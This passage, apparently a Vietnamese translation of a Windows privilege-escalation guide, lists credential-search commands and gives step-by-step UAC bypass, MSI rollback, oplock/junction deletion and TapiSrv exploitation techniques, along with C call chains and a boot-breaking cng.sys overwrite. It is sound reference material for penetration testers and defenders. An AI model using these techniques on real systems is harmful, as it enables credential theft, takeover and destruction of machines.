Trong các CLSID của registry này, bạn có thể tìm thấy registry con **InProcServer32**, chứa **giá trị mặc định** trỏ đến một **DLL** và một giá trị có tên **ThreadingModel**, có thể là **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single hoặc Multi) hoặc **Neutral** (Thread Neutral).

![Lịch sử trình duyệt - COM DLL Overwriting: Trong các CLSID của registry này, bạn có thể tìm thấy registry con InProcServer32, chứa giá trị mặc định trỏ đến một DLL và một giá trị...](<../../images/image (729).png>)

Về cơ bản, nếu bạn có thể **ghi đè bất kỳ DLL nào** sắp được thực thi, bạn có thể **leo thang đặc quyền** nếu DLL đó được một người dùng khác thực thi.

Để tìm hiểu cách kẻ tấn công sử dụng COM Hijacking làm cơ chế duy trì quyền truy cập, hãy xem:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Tìm kiếm mật khẩu tổng quát trong tệp và registry**

**Tìm kiếm nội dung tệp**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tìm kiếm tệp có tên cụ thể**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tìm kiếm registry để tìm tên khóa và mật khẩu**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Công cụ tìm kiếm mật khẩu

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **là một plugin msf** do tôi tạo. Plugin này **tự động thực thi mọi POST module của metasploit tìm kiếm thông tin xác thực** bên trong máy nạn nhân.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) tự động tìm kiếm tất cả các tệp chứa mật khẩu được đề cập trên trang này.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) là một công cụ tuyệt vời khác để trích xuất mật khẩu từ hệ thống.

Công cụ [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tìm kiếm **session**, **tên người dùng** và **mật khẩu** của một số công cụ lưu dữ liệu này dưới dạng văn bản thuần (PuTTY, WinSCP, FileZilla, SuperPuTTY và RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Hãy tưởng tượng **một process chạy với quyền SYSTEM mở một process mới** (`OpenProcess()`) với **full access**. Process đó **cũng tạo một process mới** (`CreateProcess()`) **với quyền thấp nhưng kế thừa tất cả handle đang mở của process chính**.\
Sau đó, nếu bạn có **full access vào process có quyền thấp**, bạn có thể lấy **handle đang mở tới process đặc quyền được tạo** bằng `OpenProcess()` và **inject shellcode**.\
[Đọc ví dụ này để biết thêm thông tin về **cách phát hiện và khai thác lỗ hổng này**.](leaked-handle-exploitation.md)\
[Đọc [bài viết khác này](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) để hiểu đầy đủ hơn cách kiểm tra và lạm dụng các handle đang mở khác của process và thread được kế thừa với nhiều mức quyền khác nhau (không chỉ full access).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Các phân đoạn bộ nhớ dùng chung, được gọi là **pipes**, cho phép các process giao tiếp và truyền dữ liệu.

Windows cung cấp tính năng **Named Pipes**, cho phép các process không liên quan chia sẻ dữ liệu, kể cả qua các mạng khác nhau. Cơ chế này tương tự kiến trúc client/server, với các vai trò được gọi là **named pipe server** và **named pipe client**.

Khi **client** gửi dữ liệu qua pipe, **server** thiết lập pipe có thể **mạo danh** **client**, với điều kiện server có quyền **SeImpersonate** cần thiết. Nếu xác định được một **process đặc quyền** giao tiếp qua pipe mà bạn có thể bắt chước, bạn có cơ hội **nâng cao quyền** bằng cách mạo danh process đó khi nó tương tác với pipe do bạn thiết lập. Hướng dẫn thực hiện kiểu tấn công này có thể tìm thấy [**ở đây**](named-pipe-client-impersonation.md) và [**ở đây**](#from-high-integrity-to-system).

Ngoài ra, công cụ sau cho phép **chặn giao tiếp qua named pipe bằng công cụ như burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **và công cụ này cho phép liệt kê, xem tất cả các pipe để tìm privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Dịch vụ Telephony (TapiSrv) ở chế độ server công khai `\\pipe\\tapsrv` (MS-TRP). Client đã xác thực từ xa có thể khai thác đường xử lý sự kiện bất đồng bộ dựa trên mailslot để biến `ClientAttach` thành thao tác **ghi 4 byte tùy ý** vào bất kỳ file hiện có nào mà `NETWORK SERVICE` có quyền ghi, sau đó giành quyền quản trị Telephony và nạp DLL tùy ý dưới danh nghĩa service. Toàn bộ quy trình:

- Gọi `ClientAttach` với `pszDomainUser` được đặt thành đường dẫn hiện có có thể ghi → service mở file bằng `CreateFileW(..., OPEN_EXISTING)` và dùng nó để ghi sự kiện bất đồng bộ.
- Mỗi sự kiện ghi `InitContext` do attacker kiểm soát từ `Initialize` vào handle đó. Đăng ký một line app bằng `LRegisterRequestRecipient` (`Req_Func 61`), kích hoạt `TRequestMakeCall` (`Req_Func 121`), lấy dữ liệu qua `GetAsyncEvents` (`Req_Func 0`), sau đó hủy đăng ký/tắt service để lặp lại các lần ghi một cách xác định.
- Thêm tài khoản của bạn vào `[TapiAdministrators]` trong `C:\Windows\TAPI\tsec.ini`, kết nối lại, sau đó gọi `GetUIDllName` với đường dẫn DLL tùy ý để thực thi `TSPI_providerUIIdentify` dưới danh nghĩa `NETWORK SERVICE`.

Chi tiết thêm:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Các phần mở rộng file có thể thực thi nội dung trong Windows

Xem trang **[https://filesec.io/](https://filesec.io/)**

### Lạm dụng Protocol handler / ShellExecute qua Markdown renderer

Các liên kết Markdown có thể nhấp được chuyển đến `ShellExecuteExW` có thể kích hoạt các URI handler nguy hiểm (`file:`, `ms-appinstaller:` hoặc bất kỳ scheme nào đã đăng ký) và thực thi file do attacker kiểm soát với quyền của user hiện tại. Xem:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Giám sát Command Line để tìm mật khẩu**

Khi lấy được shell với tư cách một user, có thể có scheduled task hoặc process khác đang chạy và **truyền thông tin xác thực trên command line**. Script dưới đây ghi lại command line của process mỗi hai giây, so sánh trạng thái hiện tại với trạng thái trước đó và xuất ra mọi khác biệt.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Đánh cắp mật khẩu từ các tiến trình

## Từ người dùng đặc quyền thấp đến NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Nếu bạn có quyền truy cập vào giao diện đồ họa (qua console hoặc RDP) và UAC được bật, thì ở một số phiên bản Microsoft Windows, người dùng không có đặc quyền có thể chạy terminal hoặc bất kỳ tiến trình nào khác với quyền "NT\AUTHORITY SYSTEM".

Điều này cho phép đồng thời nâng quyền và bypass UAC bằng cùng một lỗ hổng. Ngoài ra, không cần cài đặt gì và binary được sử dụng trong quá trình này đã được Microsoft ký và phát hành.

Một số hệ thống bị ảnh hưởng gồm:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Để khai thác lỗ hổng này, cần thực hiện các bước sau:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Bạn có tất cả các tệp và thông tin cần thiết trong repository GitHub sau:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Từ mức toàn vẹn Medium của Administrator lên mức High / UAC Bypass

Đọc nội dung này để **tìm hiểu về các mức toàn vẹn**:


{{#ref}}
integrity-levels.md
{{#endref}}

Sau đó **đọc nội dung này để tìm hiểu về UAC và các cách bypass UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Đưa junction của thư mục upload vào thư mục gốc được phục vụ

Ứng dụng có thể tạo một thư mục con upload với đường dẫn có thể dự đoán, ghi tên tệp do người gọi cung cấp vào đó rồi xử lý tệp. Nếu người dùng có đặc quyền thấp có thể xóa rồi thay thế thư mục con đó bằng NTFS junction trước khi máy chủ ghi tệp, thao tác ghi có thể đi theo junction vào một thư mục được web server phục vụ. Script được đặt tại đó có thể chạy dưới danh tính của web service nếu máy chủ thực thi loại tệp đó. Đây là ranh giới ghi tùy ý đặc thù của ứng dụng; chỉ riêng việc thư mục upload có thể ghi được hoặc đã tồn tại một junction không đủ để chứng minh điều này.

Kiểm tra chính xác cách tạo đường dẫn và thời điểm thực hiện trong trình xử lý upload, quyền xóa/tạo thực tế của người dùng trên thư mục con, ACL hiệu lực của đích đến, liệu tiến trình ghi có đi theo reparse point hay không và web server có thực thi tệp trong thư mục đích đó hay không. Xác nhận riêng danh tính tiến trình ghi và web server. Việc kiểm kê thụ động có thể hiển thị ACL thư mục và metadata reparse, nhưng không thể xác định hành vi của trình xử lý hoặc việc thay junction trong tương lai. Nếu tệp được thực thi dưới tài khoản dịch vụ, hãy kiểm tra **token tiến trình thực tế** trước khi xem xét bất kỳ hướng khai thác đặc quyền token riêng nào.

## Dọn dẹp tác vụ đã lên lịch đặc quyền được kích hoạt bởi WNF

Một tác vụ đã lên lịch không cho phép chạy thủ công vẫn có thể để lộ một trigger mà người dùng không có đặc quyền kích hoạt được. Khi kiểm tra một tác vụ đặc quyền, hãy xuất XML của tác vụ và kiểm tra **tất cả** trigger cũng như DACL, principal và action của tác vụ. Cụ thể, `WnfStateChangeTrigger` chỉ định một trạng thái Windows Notification Facility (WNF); nếu người dùng hiện tại được phép publish bản cập nhật lên trạng thái có thể bảo vệ này, người dùng có thể gián tiếp khởi chạy tác vụ dưới danh tính đã cấu hình, bất chấp `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Ví dụ, tác vụ Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` chạy dưới quyền SYSTEM, chấp nhận các bản cập nhật đến trạng thái WNF `7508BCA32C079E41` từ người dùng tiêu chuẩn, rồi kiểm tra `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` ngay cả khi Recall đã bị tắt.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Để kiểm tra khả năng truy cập, phân giải `ZwUpdateWnfStateData` từ `ntdll.dll`, gửi một bản cập nhật rỗng cho state name tám byte, rồi đối chiếu trạng thái trả về với dữ liệu lần chạy gần nhất của task hoặc hoạt động trong Procmon. Probe rút gọn sau đây dùng chuỗi byte từ ví dụ Recall task; thay bằng các byte được xuất cho task đang kiểm tra.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Biến cleanup đệ quy thành thao tác xóa với quyền cao

Primitive hữu ích không chỉ là trigger, mà là một routine cleanup có quyền cao chấp nhận thư mục do attacker kiểm soát. Theo dõi thao tác từ lúc liệt kê đến khi thay đổi cuối cùng: việc phát hiện profile/session, các thư mục con được chọn bằng wildcard, `SHCreateItemFromParsingName` và `IFileOperation::DeleteItem` là những dấu hiệu rõ ràng cho thấy một pathname đã được kiểm tra trước đó sẽ được duyệt đệ quy về sau. Nếu các thư mục con không được mở tương đối với các directory handle đáng tin cậy và xác thực trước khi xóa, attacker có thể thay đổi cách phân giải đường dẫn giữa lúc liệt kê và sử dụng.<sup>[[43]](#references)</sup>

Kết hợp WNF trigger với kỹ thuật [oplock, junction và Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) được mô tả bên dưới: oplock tạm dừng cleaner sau khi nó chọn thư mục con hợp lệ, trong khi ancestor có quyền ghi bị thay thế để thao tác xóa có quyền cao tiếp tục và phân giải đường dẫn qua `\RPC Control` đến target được bảo vệ. Trong Recall chain, kỹ thuật này đã dẫn đến thao tác xóa `C:\Config.Msi` bằng quyền SYSTEM, điều cần thiết cho kỹ thuật MSI rollback đã được ghi nhận.<sup>[[31]](#references)[[43]](#references)</sup>

### Các thư mục con lồng nhau vượt qua những bản sửa lỗi reparse point chỉ kiểm tra nông

Chỉ xác thực root do attacker kiểm soát và thư mục con trực tiếp của nó không bảo vệ được thao tác xóa đệ quy dựa trên pathname. Giữ nguyên các đối tượng đã kiểm tra đó và chuyển thao tác thay thế junction/oplock xuống một thư mục con bổ sung bên dưới; cuối cùng `IFileOperation::DeleteItem` sẽ đi đến thư mục con chưa được xác thực và theo target mới của nó. CVE-2026-20941 xuất phát chính xác từ kiểu bản sửa lỗi chưa hoàn chỉnh này: bản vá Recall đầu tiên xác thực `UKP` và thư mục có tên dạng GUID nhưng vẫn giữ thao tác xóa đệ quy cũ.<sup>[[43]](#references)</sup>

Mẫu an toàn là mở **mọi thư mục con** tương đối với một directory handle đã đáng tin cậy, lấy và xác minh đường dẫn/đối tượng cuối cùng đã được phân giải, rồi áp dụng disposition xóa lên handle đã xác minh đó. Đừng xác thực một prefix rồi quay lại thao tác xóa đệ quy dựa trên path. Khi xem xét bản vá, hãy kiểm tra cả các cấu trúc tại vị trí lời gọi thực tế: trong trường hợp này, việc kiểm tra runtime `OBJECT_ATTRIBUTES` tại `NtCreateFile` cho thấy `RootDirectory` khác null và tên tương đối `{GUID}\\secure_file.lock`, qua đó bác bỏ kết quả decompiler gây hiểu nhầm rằng có một primitive `FILE_DELETE_ON_CLOSE` thứ hai.<sup>[[43]](#references)</sup>

## Từ xóa/di chuyển/đổi tên thư mục tùy ý đến SYSTEM EoP

Kỹ thuật được mô tả [**trong bài blog này**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), cùng với mã khai thác [**có tại đây**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Về cơ bản, cuộc tấn công lợi dụng tính năng rollback của Windows Installer để thay thế các file hợp lệ bằng file độc hại trong quá trình gỡ cài đặt. Để thực hiện việc này, attacker cần tạo một **MSI installer độc hại** nhằm chiếm quyền kiểm soát thư mục `C:\Config.Msi`. Sau đó, Windows Installer sẽ dùng thư mục này để lưu các file rollback trong quá trình gỡ cài đặt những MSI package khác; các file rollback này sẽ bị sửa đổi để chứa payload độc hại.

### Chèn đường dẫn cleanup COM của Windows Installer (CVE-2025-27727)

Client có quyền thấp có thể truy cập dịch vụ `msiexec.exe` chạy bằng quyền SYSTEM thông qua đối tượng COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering xác định các lời gọi `IMsiServer` liên quan là `MsiBeginTransactionW` tại offset vtable `0xA0`, `SetEEUIDirectoryAndFilter` tại `0xC8` và `CleanupTempPackages` tại `0x50`. Các tên và offset này được xác định bằng reverse engineering và có thể khác nhau giữa các build.<sup>[[41]](#references)</sup>

Với người dùng không phải administrator, `SetEEUIDirectoryAndFilter` chỉ impersonate caller trong lúc mở đường dẫn được cung cấp với `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` và `FILE_FLAG_OPEN_REPARSE_POINT`. Điều này chứng minh caller có thể xóa thư mục và tránh đi theo reparse point, nhưng **không** gắn đối tượng file đã kiểm tra với thao tác cleanup về sau, cũng không chứng minh rằng Windows Installer đã tạo đối tượng đó.<sup>[[41]](#references)</sup>

Sau `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` lên lịch đường dẫn dưới dạng thư mục bất kể giá trị filter do caller truyền vào. Service ghi một giá trị `REG_DWORD` có tên xác định trong `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: tên giá trị là đường dẫn do caller kiểm soát, còn dữ liệu `0x00000002` là cờ thư mục. Sau đó, `CleanupTempPackages(NULL, FALSE)` đi thẳng vào quy trình cleanup. Worker chạy với quyền cao của nó liệt kê các giá trị registry và chuyển các mục thư mục cho `FDeleteFolder` đệ quy mà không kiểm tra nguồn gốc đường dẫn. Nếu thao tác gỡ bỏ thông thường thất bại, code cũng gọi `LockdownPath`, xóa các thuộc tính file rồi thử lại.<sup>[[41]](#references)</sup>

Chuỗi lời gọi tối thiểu được khôi phục từ `msi.dll` là:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive hữu ích ở đây là tái sử dụng đường dẫn, chứ không phải chuyển hướng bằng junction. Đăng ký một `C:\Config.Msi` do attacker tạo, xóa nó, rồi để Windows Installer tạo lại cùng đường dẫn với dữ liệu rollback được bảo vệ. Quá trình dọn dẹp tin vào tên `TempPackages` đã lỗi thời và xóa thư mục mới dưới quyền SYSTEM. Cách này vượt qua ranh giới bảo vệ dự kiến của `FILE_FLAG_OPEN_REPARSE_POINT` và biện pháp giảm thiểu dựa trên độ tin cậy của chuyển hướng, vì không cần reparse point.<sup>[[41]](#references)</sup>

Primitive xóa này phù hợp với chuỗi rollback bên dưới: giữ lại bản ghi `Installer\Folders` riêng biệt, xóa `C:\Config.Msi` được bảo vệ, tạo lại nó với NULL DACL, rồi giữ một handle được cấp quyền `WRITE_DAC` trước khi installer siết chặt DACL. Handle đã mở sẵn có thể khôi phục DACL dễ dãi bằng `NtSetSecurityObject`, sau đó có thể thay thế `.rbs` được tạo ra trước khi rollback tiếp tục.<sup>[[41]](#references)</sup>

Microsoft đã sửa đường dẫn này bằng cách ngăn `CMsiTransaction::SetEEUIDirectoryAndFilter` gọi `ScheduleFileOrFolderDelete` khi bật feature gate mới. Lệnh gọi COM vẫn có thể trả về thành công, nhưng nó không còn thêm đường dẫn do attacker kiểm soát vào `TempPackages`. Hãy áp dụng các bản cập nhật bảo mật Windows tháng 4 năm 2025 thay vì dựa vào việc phương thức trả về thành công để kiểm tra bản vá.<sup>[[41]](#references)[[42]](#references)</sup>

Kỹ thuật được tóm tắt như sau:

1. **Giai đoạn 1 – Chuẩn bị cho việc chiếm quyền (để `C:\Config.Msi` trống)**

- Bước 1: Cài đặt MSI
    - Tạo một `.msi` cài đặt một tệp vô hại (ví dụ: `dummy.txt`) vào một thư mục có thể ghi (`TARGETDIR`).
    - Đánh dấu installer là **"UAC Compliant"** để **người dùng không phải admin** có thể chạy nó.
    - Giữ một **handle** mở tới tệp sau khi cài đặt.

- Bước 2: Bắt đầu gỡ cài đặt
    - Gỡ cài đặt cùng `.msi`.
    - Quá trình gỡ cài đặt bắt đầu chuyển các tệp vào `C:\Config.Msi` và đổi tên chúng thành các tệp `.rbf` (bản sao lưu rollback).
    - **Thăm dò handle tệp đang mở** bằng `GetFinalPathNameByHandle` để phát hiện khi tệp trở thành `C:\Config.Msi\<random>.rbf`.

- Bước 3: Đồng bộ hóa tùy chỉnh
    - `.msi` có một **custom uninstall action (`SyncOnRbfWritten`)** để:
        - Báo hiệu khi `.rbf` đã được ghi.
        - Sau đó **chờ** một sự kiện khác trước khi tiếp tục gỡ cài đặt.

- Bước 4: Ngăn xóa `.rbf`
    - Khi nhận được tín hiệu, **mở tệp `.rbf`** mà không có `FILE_SHARE_DELETE` — thao tác này **ngăn tệp bị xóa**.
    - Sau đó **phát tín hiệu phản hồi** để quá trình gỡ cài đặt hoàn tất.
    - Windows Installer không xóa được `.rbf`; vì không thể xóa toàn bộ nội dung, **`C:\Config.Msi` không bị xóa**.

- Bước 5: Xóa `.rbf` thủ công
    - Bạn (attacker) tự xóa tệp `.rbf`.
    - Lúc này, **`C:\Config.Msi` đã trống**, sẵn sàng bị chiếm quyền.

> Tại thời điểm này, **kích hoạt lỗ hổng xóa thư mục tùy ý ở cấp SYSTEM** để xóa `C:\Config.Msi`.

2. **Giai đoạn 2 – Thay thế rollback script bằng các script độc hại**

- Bước 6: Tạo lại `C:\Config.Msi` với ACL yếu
    - Tự tạo lại thư mục `C:\Config.Msi`.
    - Đặt **DACL yếu** (ví dụ: Everyone:F) và **giữ một handle mở** với quyền `WRITE_DAC`.

- Bước 7: Chạy một lượt cài đặt khác
    - Cài đặt lại `.msi` với:
        - `TARGETDIR`: Vị trí có thể ghi.
        - `ERROROUT`: Một biến kích hoạt lỗi bắt buộc.
    - Lượt cài đặt này sẽ được dùng để kích hoạt **rollback** lần nữa, quá trình này đọc `.rbs` và `.rbf`.

- Bước 8: Theo dõi `.rbs`
    - Dùng `ReadDirectoryChangesW` để theo dõi `C:\Config.Msi` cho đến khi xuất hiện `.rbs` mới.
    - Ghi lại tên tệp.

- Bước 9: Đồng bộ hóa trước rollback
    - `.msi` có một **custom install action (`SyncBeforeRollback`)** để:
        - Phát tín hiệu sự kiện khi `.rbs` được tạo.
        - Sau đó **chờ** trước khi tiếp tục.

- Bước 10: Áp dụng lại ACL yếu
    - Sau khi nhận được sự kiện `.rbs created`:
        - Windows Installer **áp dụng lại ACL mạnh** cho `C:\Config.Msi`.
        - Nhưng vì bạn vẫn có handle với quyền `WRITE_DAC`, bạn có thể **áp dụng lại ACL yếu**.

> ACL chỉ được **kiểm tra khi mở handle**, vì vậy bạn vẫn có thể ghi vào thư mục.

- Bước 11: Thả `.rbs` và `.rbf` giả
    - Ghi đè tệp `.rbs` bằng một **rollback script giả** hướng dẫn Windows:
        - Khôi phục tệp `.rbf` của bạn (DLL độc hại) vào một **vị trí đặc quyền** (ví dụ: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Thả `.rbf` giả chứa **DLL payload độc hại ở cấp SYSTEM**.

- Bước 12: Kích hoạt rollback
    - Phát tín hiệu sự kiện đồng bộ để installer tiếp tục.
    - Một **custom action loại 19 (`ErrorOut`)** được cấu hình để **cố ý làm cài đặt thất bại** tại một thời điểm đã biết.
    - Việc này khiến **rollback bắt đầu**.

- Bước 13: SYSTEM cài đặt DLL của bạn
    - Windows Installer:
        - Đọc `.rbs` độc hại của bạn.
        - Sao chép DLL `.rbf` của bạn vào vị trí đích.
    - Giờ đây bạn có **DLL độc hại trong đường dẫn được SYSTEM tải**.

- Bước cuối: Thực thi mã SYSTEM
    - Chạy một **binary tự động nâng quyền đáng tin cậy** (ví dụ: `osk.exe`) tải DLL mà bạn đã chiếm quyền.
    - **Bùm**: Mã của bạn được thực thi **với quyền SYSTEM**.


### Từ xóa/di chuyển/đổi tên tệp tùy ý đến SYSTEM EoP

Kỹ thuật MSI rollback chính (ở phần trước) giả định rằng bạn có thể xóa **toàn bộ thư mục** (ví dụ: `C:\Config.Msi`). Nhưng nếu lỗ hổng của bạn chỉ cho phép **xóa tệp tùy ý** thì sao?

Bạn có thể khai thác **các thành phần bên trong NTFS**: mỗi thư mục có một alternate data stream ẩn tên là:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream này lưu trữ **metadata chỉ mục** của thư mục.

Vì vậy, nếu bạn **xóa stream `::$INDEX_ALLOCATION`** của một thư mục, NTFS sẽ **xóa toàn bộ thư mục** khỏi hệ thống tệp.

Bạn có thể thực hiện việc này bằng các API xóa tệp tiêu chuẩn như:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mặc dù bạn đang gọi API xóa *file*, nó **xóa chính folder đó**.

### Từ xóa nội dung folder đến SYSTEM EoP
Nếu primitive của bạn không cho phép xóa các file/folder tùy ý, nhưng **cho phép xóa *nội dung* của một folder do attacker kiểm soát thì sao?**

1. Bước 1: Tạo folder và file mồi
- Tạo: `C:\temp\folder1`
- Bên trong folder đó: `C:\temp\folder1\file1.txt`

2. Bước 2: Đặt một **oplock** lên `file1.txt`
- Oplock **tạm dừng quá trình thực thi** khi một process có đặc quyền cố xóa `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Bước 3: Kích hoạt tiến trình SYSTEM (ví dụ: `SilentCleanup`)
- Tiến trình này quét các thư mục (ví dụ: `%TEMP%`) và cố gắng xóa nội dung bên trong.
- Khi tiến trình này đến `file1.txt`, **oplock được kích hoạt** và chuyển quyền điều khiển cho callback của bạn.

4. Bước 4: Bên trong callback của oplock – chuyển hướng thao tác xóa

- Tùy chọn A: Di chuyển `file1.txt` đến nơi khác
    - Thao tác này làm trống `folder1` mà không phá vỡ oplock.
    - Đừng xóa trực tiếp `file1.txt` — làm vậy sẽ giải phóng oplock sớm.

- Tùy chọn B: Chuyển `folder1` thành một **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Tùy chọn C: Tạo một **symlink** trong `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Thao tác này nhắm đến stream nội bộ NTFS lưu metadata của thư mục — xóa stream này sẽ xóa thư mục.

5. Bước 5: Giải phóng oplock
- Tiến trình SYSTEM tiếp tục và cố xóa `file1.txt`.
- Nhưng lúc này, do junction + symlink, thực tế nó đang xóa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Kết quả**: `C:\Config.Msi` bị SYSTEM xóa.

### Từ tạo thư mục tùy ý đến DoS vĩnh viễn

Khai thác một primitive cho phép bạn **tạo thư mục tùy ý với quyền SYSTEM/admin** — ngay cả khi **bạn không thể ghi file** hoặc **đặt quyền yếu**.

Tạo một **thư mục** (không phải file) có tên của một **Windows driver quan trọng**, ví dụ:
```
C:\Windows\System32\cng.sys
```

- Đường dẫn này thường tương ứng với driver kernel-mode `cng.sys`.
- Nếu bạn **tạo sẵn nó dưới dạng thư mục**, Windows sẽ không tải được driver thực khi khởi động.
- Sau đó, Windows cố tải `cng.sys` trong quá trình khởi động.
- Windows thấy thư mục, **không thể phân giải driver thực**, và **bị crash hoặc dừng khởi động**.
- **Không có phương án dự phòng** và **không thể khôi phục** nếu không có can thiệp từ bên ngoài (ví dụ: sửa lỗi khởi động hoặc truy cập đĩa).

### Từ các đường dẫn log/backup có đặc quyền + OM symlinks đến arbitrary file overwrite / boot DoS

Khi một **dịch vụ có đặc quyền** ghi log/xuất dữ liệu vào một đường dẫn lấy từ **config có thể ghi**, hãy chuyển hướng đường dẫn đó bằng **Object Manager symlinks + NTFS mount points** để biến thao tác ghi có đặc quyền thành arbitrary overwrite (kể cả **khi không có SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Yêu cầu**
- Config lưu đường dẫn đích có thể được attacker ghi (ví dụ: `%ProgramData%\...\.ini`).
- Có khả năng tạo mount point đến `\RPC Control` và OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Có thao tác có đặc quyền ghi vào đường dẫn đó (log, export, report).

**Chuỗi ví dụ**
1. Đọc config để lấy đường dẫn log có đặc quyền, ví dụ: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` trong `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Chuyển hướng đường dẫn mà không cần admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
